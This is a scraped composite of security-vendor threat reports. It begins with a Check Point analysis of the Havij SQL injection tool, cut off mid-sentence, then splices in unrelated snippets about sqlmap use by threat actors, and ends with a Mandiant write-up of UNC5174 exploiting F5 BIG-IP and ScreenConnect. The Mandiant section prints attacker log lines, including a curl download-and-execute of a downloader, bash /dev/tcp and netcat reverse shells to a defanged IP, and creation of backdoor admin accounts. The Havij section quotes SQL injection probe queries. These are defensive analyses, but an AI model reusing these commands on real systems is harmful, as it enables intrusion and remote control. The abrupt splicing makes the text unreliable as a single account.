[{"@context":"https:\/\/schema.org\/","@type":"Article","@id":"https:\/\/blog.checkpoint.com\/security\/analysis-havij-sql-injection-tool\/#Article","url":"https:\/\/blog.checkpoint.com\/security\/analysis-havij-sql-injection-tool\/","inLanguage":"en-US","mainEntityOfPage":"https:\/\/blog.checkpoint.com\/security\/analysis-havij-sql-injection-tool\/","headline":"Analysis of the Havij SQL Injection tool","description":"Check Point researchers provide an analysis of the Havij SQL injection tool.","articleBody":"Havij, an automatic SQL Injection tool, is distributed by ITSecTeam, an Iranian security company. The name Havij means \u201ccarrot\u201d, which is the tool\u2019s icon.  The tool is designed with a user-friendly GUI that makes it easy for an operator to retrieve the desired data. Such ease of use may be the reason behind the transition from attacks deployed by code-writing hackers to those by non-technical users.  Havij was published during 2010, and since its, release several other automatic SQL Injection tools (such as sqlmap) were introduced. However, Havij is still active and commonly used by both penetration testers and low level hackers.          Havij traffic is easily identified by its user agent:  Mozilla\/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij     Check Point\u2019s IPS protection which detects SQL Injection attempts using this tool, \u201cHavij Automated SQL Injection tool\u201d, has detected attacks toward 30% of the monitored customers in Chek Point\u2019s Managed Security Service.  Review of the connections\u2019 details indicates that the majority of the detected attacks included the input 999999.9, usually used to scan a website for an injection vulnerability. Most of the queries had the following structure: SELECT * FROM table_example WHERE ID  999999.9  Error messages are not hidden. Therefore, if an error is received, the source knows the website is vulnerable to injection attempts.  Another method used by Havij is \u201cattempting\u201d to convert something to integer values which can\u2019t be converted. For example, the DB name (usually a string):     SELECT * FROM table_example WHERE ID  CONVERT (int, db_name()) and 11     The ensuing error message exposes the DB name:     Conversion failed when converting the nvarchar value \u2018BadWebsite\u2019 to data type int.     Havij attempts to extract the tables and columns names in a similar manner  Once Havij is served with a vulnerable website, it enables the attacker to analyze the site and bring back the DB name, tables\u2019 names and the actual data. Once the schema is received, the attacker can choose the specific columns they would like to obtain (see example below).       As Havij scans for several SQLi vulnerabilities, it is detected by other IPS protections as well. This gives us another clue on what the scanning tool looks for, namely:  \tSQL Servers MySQL Vendor-specific SQL Injection \tSQL Servers Time-based SQL Injection \tSQL Servers Stack Query SQL Injection \tSQL Servers SQL Injection Evasion Techniques \tSQL Servers UNION Query-based SQL Injection  Based on the attacks detected against Managed Service customers, it seems the majority of the attacks originated from IP addresses registered in the United States, as seen in the graph below.       The easy-to-operate program, together with the free version and quick analysis, makes Havij one of the most common tools for automated SQL Injection and vulnerability assessments. Tools such as Havij are changing the landscape of cyber attacks, as attackers no longer require the resources once needed to deploy attacks. This may also mean that not all attacks will necessarily carry information disclosure or damage \u2013 they sometimes only serve to pass a boring afternoon for a high-school kid, playing with a cool To launch attacks, they used various penetration testing tools such as sqlmap, Acunetix, Beef Framework, X-Ray, Metasploit, ARL (Asset Reconnaissance Lighthouse), and Dirsearch.
According to Group-IB, the malicious server is 139.180.137[.]107. We found logs of several penetration testing tools on this server, including sqlmap.
Some of the tools used by the threat actor include dirsearch, sqlmap, tinyproxy, redis-rogue-getshell, and Cobalt strike.

The threat actor conducted various activities using the host we investigated which included reconnaissance and web exploitation activities. Using tools such as WebLogicScan, Vulmap, and Xray, they were able to identify numerous vulnerable servers. They exploited several websites running Zhiyuan OA software and used SQLmap to conduct SQL injection.
Sqlmap
The threat actor used sqlmap to compromise various websites:

In this case, we have structured the report around the Diamond Model (Victim, Capability, Adversary, Infrastructure). The threat actor relied solely on open source tools and frameworks. For example, active scanning and reconnaissance was performed using sqlmap and ghauri, and if vulnerable, exploitation was performed. Command and control frameworks such as Metasploit and Sliver were then used for post exploitation activity. Detailed tactics and techniques are discussed in sections below.
SQL Injection – The threat actor used sqlmap (S0225) and ghauri to conduct SQL injections attacks on target hosts.

One of the infection vectors used involves the scanning of public-facing servers. Earth Krahang heavily employs open-source scanning tools that perform recursive searches of folders such as .git or .idea. The threat actor also resorts to simply brute-forcing directories to help identify files that may contain sensitive information such as file paths or passwords on the victim’s servers. They also tend to examine the subdomains of their targets to find interesting and possible unmaintained servers. Earth Krahang also conducts vulnerability scanning with tools like sqlmap, nuclei, xray, vscan, pocsuite, and wordpressscan to find web server vulnerabilities  that will allow them to access the server, drop web shells, and install backdoors.

During the Reconnaissance, Weaponization, and Delivery phases, web attackers use extensive automation to identify likely exploitation vectors in a target web application. As an example, for Structured Query Language injection (SQLi) attempts, attackers will often use open source or commercial tools such as:</p>
<ul>
<li>Sqlmap</li>
<li>Burp Suite</li>
<li>Havij</li>
<li>Netsparker</li>
</ul>
<p>These tools quickly send thousands of attack variations to the target web application. Depending on the application's response, these tools will flag potential attack vectors and report them to the threat actor.</p>
<h3>Web security analytics: attack session view</h3>
<p>During this initial attack phase, the WAF is dutifully identifying and blocking attack requests. Let's take a look at this web security analytics (WSA) attack session view:</p>

type\u003d\"application/ld+json\"\u003e{\"@context\":\"https://schema.org\",\"@type\":\"BlogPosting\",\"@id\":\"https://cloud.google.com/blog/topics/threat-intelligence/initial-access-brokers-exploit-f5-screenconnect\",\"headline\":\"Bringing vulnerabilities.\",\"image\":\"https://storage.googleapis.com/gweb-cloudblog-publish/images/threat-intelligence-default-banner-simplif.max-2600x2600.png\",\"author\":[{\"@type\":\"Person\",\"name\":\"Mandiant ScreenConnect"],null,null,[[null,null,[null,[null,"\u003cp\u003eWritten by: Michael Raggi, Adam Aprahamian, Dan Kelly, Mathew Potaczek, Marcin Siedlarz, Austin Larsen\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e \u003c/p\u003e"]]],[null,null,[null,[null,"\u003cp\u003eDuring the course of an intrusion investigation in late October 2023, Mandiant observed novel N-day exploitation of \u003ca href\u003d\"https://nvd.nist.gov/vuln/detail/CVE-2023-46747\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eCVE-2023-46747\u003c/u\u003e\u003c/a\u003e affecting F5 BIG-IP Traffic Management User Interface. Additionally, in February 2024, we observed exploitation of Connectwise ScreenConnect CVE-2024-1709 by the same actor. This mix of custom tooling and the SUPERSHELL framework leveraged in these incidents is assessed with moderate confidence to be unique to a People's Republic of China (PRC) threat actor, UNC5174.\u003c/p\u003e\n\u003cp\u003eMandiant assesses UNC5174 (believed to use the persona \"Uteus\") is a former member of Chinese hacktivist collectives that has since shown indications of acting as a contractor for China's Ministry of State Security (MSS) focused on executing access operations. UNC5174 has been observed attempting to sell access to U.S. defense contractor appliances, UK government entities, and institutions in Asia in late 2023 following CVE-2023-46747 exploitation. In February 2024, UNC5174 was observed exploiting \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/connectwise-screenconnect-hardening-remediation\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eConnectWise ScreenConnect vulnerability\u003c/u\u003e\u003c/a\u003e (\u003ca href\u003d\"https://nvd.nist.gov/vuln/detail/CVE-2024-1709\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eCVE-2024-1709\u003c/u\u003e\u003c/a\u003e) to compromise hundreds of institutions primarily in the U.S. and Canada.\u003c/p\u003e\n\u003ch2\u003eTargeting and Timeline\u003c/h2\u003e\n\u003cp\u003eUNC5174 has been linked to widespread aggressive targeting and intrusions of Southeast Asian and U.S. research and education institutions, Hong Kong businesses, charities and non-governmental organizations (NGOs), and U.S. and UK government organizations during October and November 2023, as well as in February 2024.\u003c/p\u003e\n\u003cp\u003eThe actor appears primarily focused on executing access operations. Mandiant observed UNC5174 exploiting various vulnerabilities during this time.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eConnectWise ScreenConnect Vulnerability CVE-2024-1709\u003c/li\u003e\n\u003cli\u003eF5 BIG-IP Configuration Utility Authentication Bypass Vulnerability CVE-2023-46747\u003c/li\u003e\n\u003cli\u003eAtlassian Confluence CVE-2023-22518\u003c/li\u003e\n\u003cli\u003eLinux Kernel Exploit CVE-2022-0185\u003c/li\u003e\n\u003cli\u003eZyxel Firewall OS Command Injection Vulnerability CVE-2022-30525\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eInvestigations revealed several instances of UNC5174 infrastructure, exposing the attackers' bash command history. This history detailed artifacts of extensive reconnaissance, web application fuzzing, and aggressive scanning for vulnerabilities on internet-facing systems belonging to prominent universities in the U.S., Oceania, and Hong Kong regions. Additionally, key strategic targets like think tanks in the U.S. and Taiwan were identified; however, Mandiant does not have significant evidence to determine successful exploitation of these targets.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 1: UNC5174 global targeting map\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/f5-connectwise-fig1.max-1700x1700.jpg","https://storage.googleapis.com/gweb-cloudblog-publish/images/f5-connectwise-fig1.max-1100x1100.jpg 1060w, https://storage.googleapis.com/gweb-cloudblog-publish/images/f5-connectwise-fig1.max-1700x1700.jpg 1630w"," 1060px,  1630px","https://storage.googleapis.com/gweb-cloudblog-publish/images/f5-connectwise-fig1.max-1700x1700.jpg"],null,3]]],[null,null,[null,[null,"\u003ch2\u003eInitial Disclosure of CVE-2023-46747\u003c/h2\u003e\n\u003cp\u003eOn Oct. 25, 2023, Praetorian published an \u003ca href\u003d\"https://www.praetorian.com/blog/advisory-f5-big-ip-rce/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eadvisory\u003c/u\u003e\u003c/a\u003e and proof-of-concept (PoC) for a zero-day (0-day) vulnerability (\u003ca href\u003d\"https://nvd.nist.gov/vuln/detail/CVE-2023-46747\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eCVE-2023-46747\u003c/u\u003e\u003c/a\u003e) impacting the F5 BIG-IP Traffic Management User Interface (TMUI). This vulnerability allows an unauthenticated remote attacker to execute arbitrary commands on the BIG-IP operating system as the root user. The blog post also detailed steps required for successful exploitation, involving Apache JServ Protocol (AJP) request smuggling to create an administrative user, which can then be leveraged to execute bash commands via the F5 Traffic Management Shell (TMSH). Following the initial advisory, F5 published a security advisory on Oct. 27, 2023. The \u003ca href\u003d\"https://my.f5.com/manage/s/article/K000137353\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eadvisory\u003c/u\u003e\u003c/a\u003e detailed the affected F5 appliance versions and provided a script for mitigating the vulnerability. Mandiant strongly recommends organizations apply the mitigation script to vulnerable F5 BIG-IP appliances and investigate for evidence of compromise.\u003c/p\u003e\n\u003ch2\u003eEvidence of Exploitation\u003c/h2\u003e\n\u003cp\u003eMandiant identified UNC5174 compromising F5 BIG-IP appliances, which exhibited evidence of administrative user account creation and execution of bash commands via the TMSH. Through investigation it became apparent that UNC5174 had exploited CVE-2023-46747 to perform actions on the appliance like account creation. The anomalous behavior appeared first in the \"\u003cem\u003e\u003cstrong\u003e/var/log/audit\u003c/strong\u003e\u003c/em\u003e\" log file, which recorded evidence of the creation of new admin user accounts and bash commands executed by the newly created user via the F5's TMSH. This action also resulted in the creation of the same new user account on the underlying operating system, including the following entries:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cem\u003e\u003cstrong\u003e/etc/passwd\u003c/strong\u003e\u003c/em\u003e\u003c/li\u003e\n\u003cli\u003e\u003cem\u003e\u003cstrong\u003e/etc/shadow\u003c/strong\u003e\u003c/em\u003e\u003c/li\u003e\n\u003cli\u003eThe creation of the user's home directory was also replicated at \u003cem\u003e\u003cstrong\u003e/home/\u0026lt;username\u0026gt;\u003c/strong\u003e\u003c/em\u003e.\u003c/li\u003e\n\u003c/ul\u003e"]]],[null,null,[null,[null,"\u003cpre\u003e\u003ccode\u003eOct 28 01:52:32 localhost.localdomain notice tmsh[30629]: \r\n01420002:5: AUDIT - pid\u003d30629 user\u003droot folder\u003d/Common \r\nmodule\u003d(tmos)# status\u003d[Command OK] cmd_data\u003dcreate \r\nauth user f5support3 password **** shell bash partition-access \r\nadd { all-partitions { role admin } }\r\n\r\nOct 28 01:53:29 localhost.localdomain notice icrd_child[18778]: \r\n01420002:5: AUDIT - pid\u003d18778 user\u003df5support3 folder\u003d/Common \r\nmodule\u003d(tmos)# status\u003d[Command OK] cmd_data\u003drun util bash -c id\u003c/code\u003e\u003c/pre\u003e\n\u003cp style\u003d\"text-align:center\"\u003e\u003cspan style\u003d\"vertical-align:baseline;color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%\"\u003eTable 1: Compromised host Audit log. Note the compromised appliance recorded timestamps in local time.\u003c/span\u003e\u003c/p\u003e"]]],[null,null,[null,[null,"\u003cp\u003eThe \"\u003cem\u003e\u003cstrong\u003e/var/log/restjavad-audit.log\u003c/strong\u003e\u003c/em\u003e\" recorded evidence of malicious requests to the REST API, including user account, HTTP request method, API endpoint, and source IP address. In the following example, UNC5174 authenticated and executed bash commands on the underlying operating system as the newly created user \"\u003cem\u003e\u003cstrong\u003ef5support3\u003c/strong\u003e\u003c/em\u003e\". The following log entries show the \u003cem\u003e\u003cstrong\u003ef5support3\u003c/strong\u003e\u003c/em\u003e user executing bash commands. The body of the POST request contains the bash command being executed.\u003c/p\u003e"]]],[null,null,[null,[null,"\u003cpre\u003e\u003ccode\u003e[I][8602][27 Oct 2023 14:53:29 UTC][ForwarderPassThroughWorker] \r\n{\"user\":\"local/f5support3\",\"method\":\"POST\",\"uri\":\"http://localhost:8100\r\n/mgmt/tm/util/bash\",\"status\":200,\"from\":\"154.12.177[.]8\"}\r\n\r\n[I][8603][27 Oct 2023 14:53:36 UTC][ForwarderPassThroughWorker] \r\n{\"user\":\"local/f5support3\",\"method\":\"PATCH\",\"uri\":\"http://localhost:8100\r\n/mgmt/shared/authz/users/f5support3\",\"status\":200,\"from\":\"154.12.177[.]8\"}\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp style\u003d\"text-align:center\"\u003e\u003cspan style\u003d\"vertical-align:baseline;color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%\"\u003eTable 2: UNC5174 bash commands with newly created username f5support3\u003c/span\u003e\u003c/p\u003e"]]],[null,null,[null,[null,"\u003cp\u003eUNC5174 then created new accounts via the F5 TMUI, attempting to appear as legitimate F5-related user accounts, including:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eF5support3\u003c/li\u003e\n\u003cli\u003eF5_admin\u003c/li\u003e\n\u003cli\u003ef5_support\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003ePost-Exploitation Tactics by UNC5174 After Successful Account Creation\u003c/h2\u003e\n\u003ch3\u003eSNOWLIGHT, GOHEAVY, GOREVERSE, and SUPERSHELL\u003c/h3\u003e\n\u003cp\u003eUNC5174 leveraged their newly minted TMSH access to download and execute \"/tmp/watchsys\" using a cURL command. Mandiant's analysis of the file \"/tmp/watchsys\" identified it as a new 64-bit ELF downloader we have named \u003cu\u003eSNOWLIGHT\u003c/u\u003e.\u003c/p\u003e\n\u003cp\u003eThe following chained bash` commands attributed to UNC5174 will perform the following actions related to SNOWLIGHT: \u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eDelete any file previously written to /tmp/watchsys.\u003c/li\u003e\n\u003cli\u003eForcefully kill the process \"watchsys\" if it is running.\u003c/li\u003e\n\u003cli\u003eDownload the file from a remote URL to /tmp/watchsys.\u003c/li\u003e\n\u003cli\u003eModify the permissions of /tmp/watchsys to allow execution.\u003c/li\u003e\n\u003cli\u003eExecute /tmp/watchsys using \"nohup\", so that the process will continue executing after the parent process is terminated.\u003c/li\u003e\n\u003cli\u003ePerform a directory listing of the /tmp directory.\u003c/li\u003e\n\u003c/ol\u003e"]]],[null,null,[null,[null,"\u003cpre\u003e\u003ccode\u003eNov  2 07:29:47 localhost.localdomain notice icrd_child[17602]: \r\n01420002:5: AUDIT - pid\u003d17602 user\u003dadmin folder\u003d/Common \r\nmodule\u003d(tmos)# status\u003d[Command OK] cmd_data\u003drun util bash \r\n-c \u0026quot;rm -rf /tmp/watchsys;killall -9 watchsys;curl -o /tmp/watchsys \r\nhttp://172.104.124[.]74/LG;chmod 755 /tmp/watchsys;nohup \r\n/tmp/watchsys \u0026amp;;ls -al /tmp/\u0026quot;\u003c/code\u003e\u003c/pre\u003e\n\u003cp style\u003d\"text-align:center\"\u003e\u003cspan style\u003d\"vertical-align:baseline;color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%\"\u003eTable 3: UNC5174 cURL command to download SNOWLIGHT downloader\u003c/span\u003e\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 2: Excerpt showing SNOWLIGHT's decoding routine and memory injection method\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/f5-connectwise-fig2.max-900x900.png",null,null,"https://storage.googleapis.com/gweb-cloudblog-publish/images/f5-connectwise-fig2.max-900x900.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003eSNOWLIGHT is a downloader written in C and is designed to run on Linux systems. SNOWLIGHT uses raw sockets to connect to a hard-coded IP address over TCP port 443 and uses a binary protocol to communicate with the command-and-control (C2 or C\u0026amp;C) server, though one variant has been observed using a fake HTTP header for an initial beacon packet. Upon successful communication with its C2 server, a secondary ELF file is downloaded and XOR decoded using the key \u0026quot;0x99\u0026quot;.\u003c/p\u003e\n\u003cp\u003eFinally, the decoded secondary ELF file is loaded into memory using Linux's \"sys_memfd_create\" and executed via \"fexecve\". The payload is downloaded directly into memory and executed without ever being written to disk. In the SNOWLIGHT variants we observed, the payloads process will run under the hard-coded name of \"\". This is identifiable in a running process list as a \"memfd\" process.\u003c/p\u003e\n\u003cp\u003eThe SNOWLIGHT sample analyzed by Mandiant was configured to download an obfuscated executable that Mandiant has dubbed GOHEAVY from infrastructure related to SUPERSHELL administrators. This payload is then executed in-memory via the previously described memfd method. The resultant GOHEAVY process-related artifacts were observed on the compromised F5 appliance:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eProcess Name: memfd:a (deleted)\u003c/li\u003e\n\u003cli\u003ePath: empty (due to the executable being un-backed)\u003c/li\u003e\n\u003cli\u003eArgs: ?\u003c/li\u003e\n\u003cli\u003eUser: root\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eGOREVERSE is a publicly available reverse shell backdoor written in GoLang that operates over Secure Shell (SSH). Mandiant observed UNC5174 deploy GOREVERSE, which called back to C2 infrastructure we previously observed hosting the SUPERSHELL framework. SUPERSHELL is a publicly available C2 framework published on GitHub and used extensively in related infrastructure by the administrators of SUPERSHELL. \u003c/p\u003e\n\u003cp\u003eMandiant observed evidence of UNC5174 issuing commands to connect bash and netcat TCP reverse shells back to the same infrastructure hosting GOREVERSE and SUPERSHELL payloads on port 443.\u003c/p\u003e"]]],[null,null,[null,[null,"\u003cpre\u003e\u003ccode\u003eNov  2 07:16:15 localhost.localdomain notice icrd_child[18778]: \r\n01420002:5: AUDIT - pid\u003d18778 user\u003dadmin folder\u003d\r\n/Common module\u003d(tmos)# status\u003d[Command OK] cmd_data\u003drun util \r\nbash -c \u0026quot;bash -i /dev/tcp/172.104.124[.]74/443 0\u0026gt;\u0026amp;1 \u0026amp;\u0026quot;|\u003c/code\u003e\u003c/pre\u003e\n\u003cp style\u003d\"text-align:center\"\u003e\u003cspan style\u003d\"vertical-align:baseline;color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%\"\u003eTable 4: UNC5174 command to download a bash web shell\u003c/span\u003e\u003c/p\u003e"]]],[null,null,[null,[null,"\u003cpre\u003e\u003ccode\u003eNov  2 07:30:37 localhost.localdomain notice icrd_child[18778]: \r\n01420002:5: AUDIT - pid\u003d18778 user\u003dadmin folder\u003d/Common \r\nmodule\u003d(tmos)# status\u003d[Command OK] cmd_data\u003drun util bash \r\n-c \u0026quot;nc 172.104.124[.]74 443 -e /bin/bash \u0026amp;\u0026quot;\u003c/code\u003e\u003c/pre\u003e\n\u003cp style\u003d\"text-align:center\"\u003e\u003cspan style\u003d\"vertical-align:baseline;color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%\"\u003eTable 5: UNC5174 command to download a netcat web shell\u003c/span\u003e\u003c/p\u003e"]]],[null,null,[null,[null,"\u003ch3\u003eInternal Reconnaissance\u003c/h3\u003e\n\u003cp\u003eShell command history artifacts on the compromised F5 appliance recorded evidence of the threat actor downloading the file \"/tmp/ss\" from the same infrastructure hosting GOREVERSE and SUPERSHELL payloads, as well as GitHub, using the cURL command.\u003c/p\u003e"]]],[null,null,[null,[null,"\u003cpre\u003e\u003ccode\u003ecurl -o /tmp/ss hxxp://172.104.124[.]74/App-amd64linux-noupx\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode\u003ecurl -o /tmp/ss hxxps://github[.]com/1n7erface/Template/releases\r\n/download/v1.2.5/App-amd64linux-noupx\u003c/code\u003e\u003c/pre\u003e\n\u003cp style\u003d\"text-align:center\"\u003e\u003cspan style\u003d\"vertical-align:baseline;color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%\"\u003eTable 6: UNC5174 command downloading unidentified additional tooling suspected of internal reconnaissance functionality\u003c/span\u003e\u003c/p\u003e"]]],[null,null,[null,[null,"\u003cp\u003eThe file \"/tmp/ss\" was not recoverable at the time of analysis; however, the GitHub URL resource https://github.com/1n7erface/Template hosts a likely related network scanning and reconnaissance tool with Chinese-language instructions. Execution of \"/tmp/ss\" was recorded in shell history, and command-line arguments indicate the tool was likely used to scan internal subnet ranges from the compromised F5 appliance using the tool \u003ca href\u003d\"https://github.com/shadow1ng/fscan\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eFSCAN\u003c/a\u003e.\u003c/p\u003e"]]],[null,null,[null,[null,"\u003cpre\u003e\u003ccode\u003e./ss -i \u0026lt;Internal CIDR block\u0026gt;\u003c/code\u003e\u003c/pre\u003e\n\u003cp style\u003d\"text-align:center\"\u003e\u003cspan style\u003d\"vertical-align:baseline;color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%\"\u003eTable 7: UNC5174 command to scan internal subnet ranges from compromised F5 appliances\u003c/span\u003e\u003c/p\u003e"]]],[null,null,[null,[null,"\u003ch3\u003eGOHEAVY Tunneler: A Closer Look\u003c/h3\u003e\n\u003cp\u003eUNC5174 employs a Golang-based tunneler tool named GOHEAVY, obfuscated using GOBFUSCATE for added stealth. This tool leverages the Gin framework to manage traffic routing functionalities. Mandiant observed GOHEAVY engaging in simultaneous communication with an external C2 server operated by SUPERSHELL administrators while opening and listening on a vast number of local UDP ports. Interestingly, GOHEAVY continuously broadcasts the string \"SpotUdp\" to existing network interfaces.\u003c/p\u003e\n\u003cp\u003eThis behavior suggests the tool's purpose lies in establishing covert communication channels and potentially facilitating lateral movement within compromised networks. The continuous \"SpotUdp\" broadcast might serve as a beacon for identifying other compromised machines running GOHEAVY within the same network\u003c/p\u003e\n\u003cp\u003eIn addition to GOHEAVY, Mandiant observed the presence of various other tools common in red teaming, including:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSLIVER client\u003c/li\u003e\n\u003cli\u003eFFUFP\u003c/li\u003e\n\u003cli\u003eSQLMAP\u003c/li\u003e\n\u003cli\u003eDIRBUSTER\u003c/li\u003e\n\u003cli\u003eMETASPLOIT\u003c/li\u003e\n\u003cli\u003eAFROG penetration testing tool\u003c/li\u003e\n\u003cli\u003eNUCLEI vulnerability scanning templates\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eUNC5174 Closes the Door Behind Them\u003c/h3\u003e\n\u003cp\u003eMandiant observed an unusual behavior by UNC5174 following their initial access on the compromised appliance. After backdoor accounts were configured, they attempted to self-patch the vulnerability using an F5-provided mitigation script \"\u003ca href\u003d\"http://mitigation.sh/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003emitigation.sh\u003c/u\u003e\u003c/a\u003e\". Mandiant assesses that this was an attempt to limit subsequent exploitation of the system by additional unrelated threat actors attempting to access the appliance. The additional commands were observed during their initial access on the compromised appliance:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ebash execution CVE-2023-46747 command run for account root6 from (HK) 61.239.68.73\u003c/li\u003e\n\u003cli\u003e28/10 14:16:23 deleted user root6\u003c/li\u003e\n\u003cli\u003e28/10 14:27:35: ran command cmd_data\u003drun /util bash -c /root/mitigation.sh -u\u003c/li\u003e\n\u003cli\u003e4/11/2023 03:36:30 /tmp/.del\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eUNC5174 Targets ScreenConnect Vulnerability\u003c/h2\u003e\n\u003cp\u003eOn Feb. 21, 2024, the actor \"uteus\" claimed in forum postings to have successfully exploited the vulnerability CVE-2024-1709 in ConnectWise ScreenConnect instances belonging to hundreds of organizations globally, primarily in the U.S. and Canada. \u003c/p\u003e\n\u003cp\u003eMandiant obtained the output of the actor's exploit, which showed the actor added the admin user \"cvetest\" to ScreenConnect instances belonging to numerous organizations. Mandiant has observed other threat actors similarly adding admin accounts at multiple victim organizations.  Mandiant was also able to confirm the compromise of several ScreenConnect instances and the presence of unauthorized users added by the uteus persona tracked as UNC5174. Mandiant assesses with moderate confidence the other organizations listed by uteus were also compromised.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 3: Geographic distribution of UNC5174 ScreenConnect targeting\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/f5-connectwise-fig3.max-1600x1600.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/f5-connectwise-fig3.max-1100x1100.png 1060w, https://storage.googleapis.com/gweb-cloudblog-publish/images/f5-connectwise-fig3.max-1600x1600.png 1568w"," 1060px,  1568px","https://storage.googleapis.com/gweb-cloudblog-publish/images/f5-connectwise-fig3.max-1600x1600.png"],null,3]]],[null,null,[null,[null,"\u003ch2\u003eAttribution\u003c/h2\u003e\n\u003cp\u003eMandiant has identified a new access operations group UNC5174 that uses the personas \"Uteus\" (alternate spelling \"uetus\") on underground forums, which we assess with moderate confidence operates from China. UNC5174 was linked with several hacktivist collectives including \"Dawn Calvary\" and \"Genesis Day\" prior to 2023 and has also claimed to be affiliated with the PRC MSS as an access broker and possible contractor who conducts for profit intrusions.\u003c/p\u003e\n\u003ch3\u003eChinese Hacktivists, UNC302, and UNC5174 Link to MSS Contractors\u003c/h3\u003e\n\u003cp\u003eMandiant assesses UNC5174 (aka Uteus) was previously a member of Chinese hacktivist collectives \"Dawn Calvary\" and has collaborated with \"Genesis Day\" / \"Xiaoqiying\" and \"Teng Snake.\" This individual appears to have departed these groups in mid-2023 and has since focused on executing access operations with the intention of brokering access to compromised environments.\u003c/p\u003e\n\u003cp\u003eAs part of our investigation, Mandiant identified key details that suggest UNC5174 may be an initial access broker acting as an MSS contractor. The actor claimed MSS affiliation in dark web forums, claiming tacit backing of an unspecified MSS-related APT actor. Additionally, the impacted organizations targeted by UNC5174, including U.S. defense and UK government entities, were targeted concurrently by distinct known MSS access brokers UNC302, which were previously \u003ca href\u003d\"https://www.justice.gov/opa/pr/two-chinese-hackers-working-ministry-state-security-charged-global-computer-intrusion\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eindicted\u003c/u\u003e\u003c/a\u003e by the U.S. Department of Justice in 2020. \u003c/p\u003e\n\u003cp\u003eOn Oct. 10, 2023, Mandiant identified event logs suggesting unconfirmed exploitation of an F5 device IP address of several government entities. This activity was associated with the UNC5174 pseudonym \"Uteus\", which shared this purported access to a U.S. military contractor and UK government organization in an online communication. The same IP address targeted through the previously described CVE-2023-46747 exploitation appeared in communications from this access broker, claiming successful exploitation of Confluence vulnerability CVE-2023-22515. Details of the intrusion were discovered within communications on a dark web forum. The Uteus persona indicated they had utilized a \u003ca href\u003d\"https://github.com/Chocapikk/CVE-2023-22515\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003epublic proof of concept\u003c/u\u003e\u003c/a\u003e to perform activities on compromised systems. Notably, Uteus is believed to be distinct from the entity \"Xiaoqiying,\" which has independently claimed to not be employed by the Chinese Government in a Telegram channel operated by the group.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 4: Telegram channel for Xiaoqiying claiming no employment with the Chinese government\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/f5-connectwise-fig4.max-900x900.png",null,null,"https://storage.googleapis.com/gweb-cloudblog-publish/images/f5-connectwise-fig4.max-900x900.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003eBased on these findings, Mandiant assesses with moderate confidence that Uteus represents an initial access broker persona for UNC5174, used to sell obtained access to compromised systems. While definitive connections cannot be established at this time, Mandiant highlights that there are similarities between UNC5174 and UNC302, which suggests they operate within an MSS initial access broker landscape. These similarities suggest possible shared exploits and operational priorities between these threat actors, although further investigation is required for definitive attribution.\u003c/p\u003e\n\u003ch2\u003eOutlook and Implications\u003c/h2\u003e\n\u003cp\u003eUNC5174 exploitation of CVE-2023-46747 as a N-day vulnerability in tandem with recent exploitation of Connectwise ScreenConnect vulnerability CVE-2024-1709 demonstrates PRC-related threat actors' systematized approach to achieving access to targets of strategic or political interest to the PRC. China-nexus actors continue to conduct vulnerability research on widely deployed edge appliances like F5 BIG-IP and ScreenConnect to enable espionage operations at scale. These operations often include rapid exploitation of recently disclosed vulnerabilities using custom or publicly available proof-of-concept exploits. UNC5174 and UNC302 operate within this model, and their operations provide insight into the initial access broker ecosystem leveraged by the MSS to target strategically interesting global organizations. Mandiant believes that UNC5174 will continue to pose a threat to organizations in the academic, NGO, and government sectors specifically in the United States, Canada, Southeast Asia, Hong Kong, and the United Kingdom.\u003c/p\u003e\n\u003ch2\u003eRemediation and 